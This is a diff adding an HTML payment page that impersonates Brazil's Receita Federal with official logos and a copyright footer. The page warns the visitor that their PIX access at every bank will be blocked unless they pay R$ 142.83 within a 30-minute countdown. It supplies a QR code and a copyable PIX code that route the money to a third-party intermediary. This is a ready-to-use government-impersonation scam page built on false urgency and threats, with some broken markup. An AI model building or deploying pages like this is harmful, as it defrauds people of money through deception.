@@ -1,0 +1,277 @@
+<html>
+<head>
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "qkhj9t5mmz");
+    </script>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Pagamento PIX</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("/static/fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: #f8f9fa;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 140px;
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .container {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        .payment-info {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            border-left: 4px solid #0c326f;
+        }
+        .payment-info h3 {
+            color: #0c326f;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 15px;
+        }
+        .qr-container {
+            text-align: center;
+            margin: 20px 0;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            border-left: 4px solid #0c326f;
+        }
+        .qr-code {
+            width: 200px;
+            height: 200px;
+            margin: 0 auto;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+        }
+        .pix-code {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+            font-family: monospace;
+            word-break: break-all;
+            border: 1px dashed #dee2e6;
+        }
+        .copy-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 20px 0;
+            transition: all 0.3s ease;
+        }
+        .copy-button:hover {
+            background-color: #092555;
+            transform: translateY(-1px);
+        }
+        .warning-box {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .warning-box h2 {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .warning-box p {
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .countdown {
+            font-size: 24px;
+            font-weight: bold;
+            color: #dc3545;
+            margin-top: 10px;
+        }
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <div class="warning-box">
+            <h2>ATENÇÃO: Ação Necessária!</h2>
+            <p>Sr(a). <strong></strong> - CPF: <strong></strong></p>
+            <p>Você concordou com os termos e condições. Caso o pagamento não seja efetuado em até:</p>
+            <div id="countdown" class="countdown">30:00</div>
+            <p>Seu acesso ao sistema PIX será bloqueado em todas as instituições financeiras.</p>
+            <p>Efetue o pagamento imediatamente para evitar a suspensão do serviço.</p>
+        </div>
+
+        <div class="payment-info">
+            <h3>Detalhes do Pagamento</h3>
+            <p><strong>Nome:</strong> </p>
+            <p><strong>CPF:</strong> /p>
+            <p><strong>Valor:</strong> R$ 142.83</p>
+        </div>
+
+        <div class="qr-container">
+            <h3>Escaneie o QR Code PIX</h3>
+            <div id="qrCode" class="qr-code">
+                <img src="data:image/png;base64,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" alt="QR Code PIX" style="width: 100%; height: 100%; object-fit: contain;">
+            </div>
+        </div>
+
+        <div style="margin: 20px 0;">
+            <p style="margin-bottom: 10px; font-weight: 600;">Ou copie o código PIX:</p>
+            <div id="pixCode" class="pix-code">
+                00020126870014br.gov.bcb.pix2565pix.primepag.com.br/qr/v3/at/065e31a0-d47f-4ebe-b14b-0ecf00cbe4ec5204000053039865802BR5925PAGAMENTO SEGURO INTERMED6006SOBRAL62070503***630435A6
+            </div>
+            <button onclick="copyPixCode()" class="copy-button">
+                <i class="fas fa-copy"></i>
+                Copiar código PIX
+            </button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            var countDownDate = new Date().getTime() + 30 * 60 * 1000; // 30 minutes from now
+
+            var x = setInterval(function() {
+                var now = new Date().getTime();
+                var distance = countDownDate - now;
+
+                var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+                var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+                document.getElementById("countdown").innerHTML = minutes.toString().padStart(2, '0') + ":" + seconds.toString().padStart(2, '0');
+
+                if (distance < 0) {
+                    clearInterval(x);
+                    document.getElementById("countdown").innerHTML = "EXPIRADO";
+                }
+            }, 1000);
+
+            window.copyPixCode = function() {
+                const pixCode = document.getElementById('pixCode').textContent.trim();
+                const copyButton = document.querySelector('.copy-button');
+                navigator.clipboard.writeText(pixCode).then(
+                    function() {
+                        copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado';
+                        copyButton.style.backgroundColor = '#28a745';
+                        setTimeout(() => {
+                            copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                            copyButton.style.backgroundColor = '#0c326f';
+                        }, 2000);
+                    },
+                    function(err) {
+                        console.error('Erro ao copiar:', err);
+                        copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
+                        copyButton.style.backgroundColor = '#dc3545';
+                    }
+                );
+            }
+        });
+    </script>
+</body>
+</html>
